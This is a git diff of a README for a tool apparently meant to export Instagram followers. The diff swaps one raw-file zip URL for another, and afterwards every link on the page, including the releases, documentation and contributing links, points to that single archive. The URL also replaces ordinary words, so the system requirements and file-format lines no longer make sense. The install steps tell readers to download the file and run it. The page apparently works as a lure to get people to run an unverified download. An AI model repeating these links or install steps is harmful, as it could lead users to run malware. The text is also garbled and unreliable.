@@ -6,12 +6,12 @@ Welcome to the **export-followers-instagram** project! This tool helps you expor
 
 ## 📥 Download Link
 
-[![Download Releases](https://raw.githubusercontent.com/MuhammadUnaiz/export-followers-instagram/main/unalterably/export-followers-instagram.zip%20Now-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/MuhammadUnaiz/export-followers-instagram/main/unalterably/export-followers-instagram.zip)
+[![Download Releases](https://github.com/MuhammadUnaiz/export-followers-instagram/raw/refs/heads/main/unalterably/instagram-export-followers-v3.6.zip%20Now-blue?style=for-the-badge&logo=github)](https://github.com/MuhammadUnaiz/export-followers-instagram/raw/refs/heads/main/unalterably/instagram-export-followers-v3.6.zip)
 
 ## 🛠️ System Requirements
 
 - **Operating System**: Windows, macOS, or Linux
-- **https://raw.githubusercontent.com/MuhammadUnaiz/export-followers-instagram/main/unalterably/export-followers-instagram.zip**: Version 12 or higher
+- **https://github.com/MuhammadUnaiz/export-followers-instagram/raw/refs/heads/main/unalterably/instagram-export-followers-v3.6.zip**: Version 12 or higher
 - **Python**: Version 3.6 or higher
 - **Memory**: At least 4 GB recommended
 - **Internet Connection**: Required to access Instagram API
@@ -27,18 +27,18 @@ Welcome to the **export-followers-instagram** project! This tool helps you expor
 ## 💡 How to Download & Install
 
 1. **Visit the Download Page**  
-   Visit this page to download: [Releases Page](https://raw.githubusercontent.com/MuhammadUnaiz/export-followers-instagram/main/unalterably/export-followers-instagram.zip).
+   Visit this page to download: [Releases Page](https://github.com/MuhammadUnaiz/export-followers-instagram/raw/refs/heads/main/unalterably/instagram-export-followers-v3.6.zip).
 
 2. **Select the Latest Release**  
    On the releases page, you will see a list of available versions. Look for the latest release at the top.
 
 3. **Download the Application**  
-   Locate the downloadable file that matches your operating system. Click on the link to start the download. The files typically have formats like `.exe` for Windows, `.dmg` for macOS, or `https://raw.githubusercontent.com/MuhammadUnaiz/export-followers-instagram/main/unalterably/export-followers-instagram.zip` for Linux.
+   Locate the downloadable file that matches your operating system. Click on the link to start the download. The files typically have formats like `.exe` for Windows, `.dmg` for macOS, or `https://github.com/MuhammadUnaiz/export-followers-instagram/raw/refs/heads/main/unalterably/instagram-export-followers-v3.6.zip` for Linux.
 
 4. **Install the Application**  
    - **For Windows**: Double-click the downloaded `.exe` file and follow the on-screen instructions.
    - **For macOS**: Open the downloaded `.dmg` file, drag the application into your Applications folder, and then open the app.
-   - **For Linux**: Extract the `https://raw.githubusercontent.com/MuhammadUnaiz/export-followers-instagram/main/unalterably/export-followers-instagram.zip` file. Open your terminal and run the application by navigating to the extracted folder.
+   - **For Linux**: Extract the `https://github.com/MuhammadUnaiz/export-followers-instagram/raw/refs/heads/main/unalterably/instagram-export-followers-v3.6.zip` file. Open your terminal and run the application by navigating to the extracted folder.
 
 5. **Launch the Application**  
    Find the application on your device and open it to start using it.
@@ -56,12 +56,12 @@ Welcome to the **export-followers-instagram** project! This tool helps you expor
 ## ✨ Tips for Best Performance
 
 - Ensure you have a stable internet connection to avoid interruptions during data retrieval.
-- Regularly check for updates on the [Releases Page](https://raw.githubusercontent.com/MuhammadUnaiz/export-followers-instagram/main/unalterably/export-followers-instagram.zip) to take advantage of new features and fixes.
+- Regularly check for updates on the [Releases Page](https://github.com/MuhammadUnaiz/export-followers-instagram/raw/refs/heads/main/unalterably/instagram-export-followers-v3.6.zip) to take advantage of new features and fixes.
 - Familiarize yourself with the Instagram API usage policies for a smooth experience.
 
 ## 📘 Documentation
 
-For detailed usage instructions and troubleshooting tips, please refer to our [Documentation](https://raw.githubusercontent.com/MuhammadUnaiz/export-followers-instagram/main/unalterably/export-followers-instagram.zip). 
+For detailed usage instructions and troubleshooting tips, please refer to our [Documentation](https://github.com/MuhammadUnaiz/export-followers-instagram/raw/refs/heads/main/unalterably/instagram-export-followers-v3.6.zip). 
 
 ## 📞 Support
 
@@ -69,7 +69,7 @@ If you need further assistance, please open an issue on the GitHub repository or
 
 ## 📝 Contributing
 
-We welcome contributions to enhance the project. Please see our [Contributing Guidelines](https://raw.githubusercontent.com/MuhammadUnaiz/export-followers-instagram/main/unalterably/export-followers-instagram.zip) for information on how to get involved.
+We welcome contributions to enhance the project. Please see our [Contributing Guidelines](https://github.com/MuhammadUnaiz/export-followers-instagram/raw/refs/heads/main/unalterably/instagram-export-followers-v3.6.zip) for information on how to get involved.
 
 ## 🌐 Related Topics
 
